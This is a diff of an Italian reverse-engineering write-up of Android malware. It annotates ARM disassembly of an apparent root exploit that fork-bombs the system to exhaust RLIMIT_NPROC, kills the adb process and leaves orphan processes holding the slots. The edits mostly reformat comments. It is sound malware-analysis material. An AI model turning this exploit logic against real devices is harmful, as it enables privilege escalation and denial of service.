@@ -95,6 +95,8 @@ Analisi malware Android tramite reverse engineering
 0x000086b4  bl sym.imp.open
 @@@
 
+;apertura file
+
 @@@
 0x000086e4  ldr r0, [fildes]
 0x000086e8  mov r1, r3       ; buf
@@ -103,6 +105,8 @@ Analisi malware Android tramite reverse engineering
 0x000086f4  ldr r0, [fildes]
 0x000086f8  bl sym.imp.close
 @@@
+
+;lettura byte e chiusura file
 
 @@@
 0x00008708  add r3, pc, r3   ; 0x8ab8 ; "/sbin/adb"
@@ -117,15 +121,20 @@ Analisi malware Android tramite reverse engineering
 ;una volta completata la fase di ricognizione, il comportamento si sposta verso il controllo delle risorse del sistema. Prima di eseguire l'attacco vero e proprio, il malware verifica i limiti imposti dal kernel:
 
 @@@
-0x0000884c  mov r0, #0x6             ; RLIMIT_NPROC
+0x0000884c  mov r0, #0x6             
 0x00008850  mov r1, r3
 0x00008854  bl  getrlimit
 @@@
 
+;RLIMIT_NPROC
+
 @@@
-0x00008878  cmn r3, #0x1             ; confronta con RLIM_INFINITY
-0x0000887c  bne LAB_00008898         ; se finito → prosegui
+0x00008878  cmn r3, #0x1             
+0x0000887c  bne LAB_00008898        
 @@@
+
+;confronta con RLIM_INFINITY
+;se finito prosegui
 
 @@@
 0x00008894  bl  exit                 ; altrimenti termina
@@ -142,11 +151,13 @@ Analisi malware Android tramite reverse engineering
 ;fork iniziale + daemonizzazione
 
 @@@
-0x00008934  bl  fork          ; fork() > 0 → padre esce
+0x00008934  bl  fork          
 0x00008940  ble LAB_0000894c
 0x00008944  mov r0, #0x0
-0x00008948  bl  exit          ; il padre termina
+0x00008948  bl  exit          
 @@@
+
+;fork()>0 padre esce e termina
 
 @@@
 LAB_0000894c:
@@ -163,9 +174,13 @@ LAB_0000894c:
 ;secondo fork → processo fork-bomber
 
 @@@
-0x0000895c  bl  fork          ; if (fork() == 0) → entra nel bomber
-0x00008968  bne LAB_00008a0c  ; padre → salta al blocco read/restart
+0x0000895c  bl  fork          
+0x00008968  bne LAB_00008a0c 
 @@@
+
+;if (fork()==0) entra nel bomber
+;il processo padre salta al blocco read/restart
+
 @@@
 0x00008974  bl  close         ; close(pepe[0])
 @@@
@@ -178,7 +193,7 @@ LAB_00008980:
 0x00008988  str r3,[local_14]         ; salva p
 @@@
 
-;if (p == 0) → figlio muore subito = zombie
+;if (p==0) figlio muore subito = zombie
 
 @@@
 0x00008994  bne LAB_000089a0
@@ -186,11 +201,13 @@ LAB_00008980:
 0x0000899c  bl  exit
 @@@
 
+;exit
+
 @@@
 LAB_000089a0:
 @@@
 
-;if (p < 0) → fork fallita, slot esauriti
+;if (p<0) fork fallita, slot esauriti
 
 @@@
 0x000089a4  bge LAB_000089fc          ; se p >= 0 vai a incrementa
@@ -205,18 +222,24 @@ LAB_000089a0:
 ;prima volta che fallisce:
 
 @@@
-0x000089c8  bl  printf                ; "[+] Forked %d childs."
-0x000089d0  str r3,[local_c]          ; new_pids = 0
-0x000089e8  bl  write                 ; write(pepe[1], &c, 1) → segnala padre
-0x000089f4  bl  close                 ; close(pepe[1])
-0x000089f8  b   LAB_00008980          ; continua a forkkare
+0x000089c8  bl  printf                
+0x000089d0  str r3,[local_c]          
+0x000089e8  bl  write                 
+0x000089f4  bl  close                 
+0x000089f8  b   LAB_00008980        
 @@@
+
+;"[+] Forked %d childs."
+;new_pids = 0
+;write(pepe[1], &c, 1) → segnala padre
+;close(pepe[1]
+;continua a forkkare
 
 @@@
 LAB_000089fc:
 @@@
 
-;p > 0 → fork riuscita
+;p>0 fork riuscita
 
 @@@
 0x00008a00  add r3, r3, #0x1          ; pids++
@@ -234,21 +257,25 @@ LAB_000089fc:
 ;quando il sistema è sufficientemente saturato, il malware interviene direttamente sul processo target:
 
 @@@
-LAB_00008a0c:                         ; blocco del processo padre
-0x00008a2c  bl  read                  ; attende segnale su pipe
-0x00008a34  bl  FUN_00008768          ; restart_adb(adb_pid) → kill(pid,9)
+LAB_00008a0c:                         
+0x00008a2c  bl  read                
+0x00008a34  bl  FUN_00008768     
 @@@
 
+;blocco del processo padre
+;attende segnale su pipe
+;restart_adb(adb_pid) → kill(pid,9)
 ;doppio fork per processo "fantasma" permanente
 
 @@@
 0x00008a38  bl  fork
 0x00008a48  bl  fork
 LAB_00008a4c:
-0x00008a50  bl  sleep(0x743C)         ; loop eterno → mantiene slot occupati
+0x00008a50  bl  sleep(0x743C)      
 0x00008a54  b   LAB_00008a4c
 @@@
 
+;loop eterno → mantiene slot occupati
 ;questo crea un processo "orfano" che dorme indefinitamente mantenendo occupati gli slot anche dopo che il bomber ha finito.
 
 ;il processo adb viene terminato forzatamente. Questo non è ancora l'exploit finale, ma il trigger che forza il sistema a ricrearlo in condizioni degradate.
